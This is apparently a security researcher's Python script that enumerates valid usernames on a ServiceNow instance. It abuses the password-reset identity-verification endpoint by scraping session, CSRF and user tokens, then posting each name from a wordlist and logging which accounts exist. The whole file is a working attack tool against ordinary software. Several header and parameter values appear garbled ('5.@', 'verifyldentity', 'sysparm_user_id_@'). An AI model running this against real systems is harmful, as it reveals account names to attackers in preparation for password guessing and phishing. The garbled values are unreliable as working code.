#!/usr/local/bin/python3
# Author: Victor Hanna (SpiderLabs)
# User enumeration script SNOW
# Requires valid 1. JSESSION (anonymous), 2. X-UserToken and 3. CSRF Token

import requests
import re
import urllib.parse
from colorama import init
from colorama import Fore, Back, Style
import sys
import os

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    print ("[+]********************************************************************************[+]")
    print ("|   Author : Victor Hanna (9lyph)["+Fore.RED + "SpiderLabs" +Style.RESET_ALL+"]\t\t\t\t\t    |")
    print ("|   Decription: SNOW Username Enumerator                                            |")
    print ("|   Usage : "+sys.argv[0]+"                                                        |")
    print ("|   Prequisite: \'users.txt\' needs to contain list of users                          |")    
    print ("[+]********************************************************************************[+]")

def main():
    os.system('clear')
    banner()
    url = "http://<redacted>:8080/"
    try:
        r = requests.get(url, timeout=10)
        JSESSIONID = r.cookies["JSESSIONID" ]
    except requests.exceptions.Timeout:
        print ("[!] Connection to host timed out !")
        sys.exit(1)
    # JSESSIONID = r.cookies["JSESSIONID" ]
    with open ("users2.txt", "r") as f:
        usernames = f.readlines()
        print (f"[+] Brute forcing ....")
        for users in usernames:
            url = "http://<redacted>:8080/$pwd_reset.do?sysparm_url=ss_default"
            headers1 = {
                "Host": "<redacted>:8080",
                "User-Agent": "Mozilla/5.@ (Windows NT 10.0; Win64; x64; rv:91.@) Gecko/2@100101 Firefox/91.0",
                "accept": "*/*",
                "accept-Language": "en-US,en;q=0.5",
                "accept-Encoding": "gzip, deflate",
                "Referer": "http://<redacted>:8080/welcome.do",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "http://<redacted>:8080/",
                "Connection": "keep-alive",
                "Cookie": "glide _user_route=glide.daof9c3b5ffff0473de46c308106297; JSESSIONID="+JSESSIONID+"; __CJ_g startTime='1629957540228'",
                "sec-Fetch-Dest": "empty",
                "sec-Fetch-Dest": "iframe",
                "sec-Fetch-Mode": "naviage",
                "sec-Fetch-Site": "same-origin",
                "sec-Fetch-User": "?1"
                }
                
            try:
                s = requests.Session()
                r = requests.get(url, headers=headers1, cookies=s.cookies, timeout=10)
                obj1 = re.findall(r"pwd_csrf_token", r.text)
                obj2 = re.findall(r"fireAll\(\"ck_updated\"", r.text)
                tokenIndex = (r.text.index(obj1[0]))
                userTokenIndex = (r.text.index(obj2[0]))
                userToken = (r.text[userTokenIndex+23 : userTokenIndex+95])
                token = (r.text[tokenIndex+45:tokenIndex+73])
                url = "http://<redacted>:8080/xmlhttp.do"
                headers2 = {
                    "Host": "<redacted>:8080",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.@) Gecko/2@100101 Firefox/91.0",
                    "accept": "*/*",
                    "accept-Language": "en-US,en;q=0.5",
                    "accept-Encoding": "gzip, deflate",
                    "Referer": "http://<redacted>:8080/$pwd_reset.do?sysparm_url=ss default",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Content-Length": "786",
                    "Origin": "http://<redacted>:8080/",
                    "Connection": "keep-alive",
                    "X-UserToken":""+userToken+"",
                    "Cookie": "glide _user_route=glide.daof9ac3b5ffff0473de46c308106297; JSESSIONID="+JSESSIONID+"; __CJ_g_ startTime=%221629957540228%22",
                    "sec-Fetch-Dest": "empty",
                    "sec-Fetch-Mode": "cors",
                    "sec-Fetch-Site": "same-origin",
                    }
                data = {
                    "sysparm_processor": "PwdAjaxVerifyIdentity",
                    "sysparm_scope": "global",
                    "sysparm_want_session_messages": "true",
                    "sysparm_name":"verifyldentity",
                    "sysparm_process_id":"c6bc20667100200a5a0f3b457415ad5",
                    "sysparm_processor_id_0":"fb9b36b3bf220100710071a7bf07390b",
                    "sysparm_user_id_@":""+users.strip()+"",
                    "sysparm_identification_number":"1",
                    "sysparam_pwd_csrf_token":""+token+"",
                    "ni.nolog.x_referer":"ignore",
                    "x_referer":"$pwd_reset.do?sysparm_url=ss_default"
                    }
                payload_str = urllib.parse.urlencode(data, safe=":+")
            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)
            try:
                s = requests.Session()
                r = requests.post(url, headers=headers2, data=data, timeout=10)
                if "500" in r.text:
                    print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
                else:
                    print (Fore.GREEN + f"[+] Valid user: {users.strip()}" + Style.RESET_ALL)
                    f = open("enumeratedUserList.txt", "a+")
                    f.write(Fore.GREEN + f"[+] Valid user: {users.strip()}\n" + Style.RESET_ALL)
                    f.close()
            except KeyboardInterrupt:
                sys.exit()
            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)
            except:
                print (Fore.RED + f"Unable to connect to host" + Style.RESET_ALL)

if __name__ == "__main__":
    main ()
